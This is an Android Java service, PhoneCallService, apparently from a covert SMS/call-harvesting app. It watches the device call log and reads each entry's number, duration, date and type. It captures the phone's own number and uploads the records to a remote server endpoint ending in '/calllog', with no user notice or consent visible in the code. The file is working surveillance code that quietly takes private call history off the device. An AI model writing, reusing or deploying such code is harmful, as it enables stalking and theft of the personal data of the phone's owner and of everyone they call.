package com.example.sms.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyCallback;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.example.sms.App;
import com.example.sms.R;
import com.example.sms.domain.SmsBean;
import com.example.sms.http.HttpUtils;
import com.example.sms.receiver.PhoneReceiver;
import com.example.sms.utils.MapUtils;
import com.example.sms.utils.SPUtils;
import com.google.gson.Gson;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;

public class PhoneCallService extends Service {
    private  ContentObserver contentObserver;
    private Handler handler = new Handler(Looper.myLooper()) {
        @Override
        public void dispatchMessage(@NonNull Message msg) {
            super.dispatchMessage(msg);
            String message = msg.getData().getString("msg");
            Log.i("test", "msg:" + message);
        }
    };
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager telephonyManager  =
                (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            telephonyManager.registerTelephonyCallback(getMainExecutor(),new MyCallStateListener());
        } else {
            telephonyManager.listen(new MyPhoneStateListener(), PhoneStateListener.LISTEN_CALL_STATE);
        }
        contentObserver = new ContentObserver(handler){
            @Override
            public void onChange(boolean selfChange, Uri uri) {
                super.onChange(selfChange);
                getPhoneLog(PhoneCallService.this,true);
            }
        };
        getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, false, contentObserver);
        getPhoneLog(this,false);
    }

    public void getPhoneLog(Context context,boolean onlyOne) {
        String saveLogs = SPUtils.getString("logs", "{}");
        HashMap logsMap = new Gson().fromJson(saveLogs, HashMap.class);
        try {
            Cursor cur = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " desc");
            cur.moveToFirst();
            if (cur.moveToFirst()) {
                int index_id = cur.getColumnIndex("_id");
                int index_number = cur.getColumnIndex("number");
                int index_phone_account_address = cur.getColumnIndex("phone_account_address");
                int index_new = cur.getColumnIndex("new");
                int index_Duration = cur.getColumnIndex("duration");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                int index_Read = cur.getColumnIndex("is_read");
                ArrayList<Object> logs = new ArrayList<>();
                do {
                    Long id = cur.getLong(index_id);
                    String number = cur.getString(index_number);
                    String address = cur.getString(index_phone_account_address);
                    int isNew = cur.getInt(index_new);
                    long duration = cur.getLong(index_Duration);
                    long longDate = cur.getLong(index_Date);
                    int type = cur.getInt(index_Type);
                    int read = cur.getInt(index_Read);
                    if (TextUtils.isEmpty(App.phoneNumber)){
                        if (!TextUtils.isEmpty(address)){
                            App.phoneNumber = address;
                        }
                    }

                    if (logsMap.containsKey(id)){
                        break;
                    }else{
                        logsMap.put(id,id);
                    }
                    logs.add(MapUtils.newMap()
                            .putVal("id",id)
                            .putVal("number",number)
                            .putVal("address",address)
                            .putVal("new",isNew)
                            .putVal("duration",duration)
                            .putVal("date",longDate)
                            .putVal("type",type)
                            .putVal("read",read));
                    if (onlyOne){
                        break;
                    }
                } while (cur.moveToNext());
                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
                if (logs.size()>0){
                    HttpUtils.post(getString(R.string.sms_url) + "/calllog", MapUtils.newMap().putVal("calllog", logs), new HttpUtils.Callback() {
                        @Override
                        public void success(JSONObject result) {
                            SPUtils.setString("logs",new Gson().toJson(logsMap));
                        }

                        @Override
                        public void error() {

                        }
                    });
                }
            } else {
            }

        } catch (SQLiteException ex) {
            Log.d("SQLiteException in getSmsInPhone", ex.getMessage());
        }
    }


    @Override
    public void onDestroy() {
        if (contentObserver!=null)
            getContentResolver().unregisterContentObserver(contentObserver);
        if (handler!=null)
            handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    public class MyPhoneStateListener extends PhoneStateListener{
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            //注意，方法必须写在super方法后面，否则incomingNumber无法获取到值。
            super.onCallStateChanged(state, incomingNumber);
            switch(state){
                case TelephonyManager.CALL_STATE_IDLE:
                    System.out.println("挂断");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    System.out.println("接听");
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    System.out.println("响铃:来电号码"+incomingNumber);
                    //输出来电号码
                    break;
            }
        }
    };

    @RequiresApi(api = Build.VERSION_CODES.S)
    public class MyCallStateListener extends TelephonyCallback implements TelephonyCallback.CallStateListener {
        @Override
        public void onCallStateChanged(int state) {
            switch (state){
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.i("TAG222", "手机状态：空闲状态");
                    break;
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.i("TAG222", "手机状态：来电话状态");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    Log.i("TAG222", "手机状态：接电话状态");
                    break;
            }
        }
    }
}
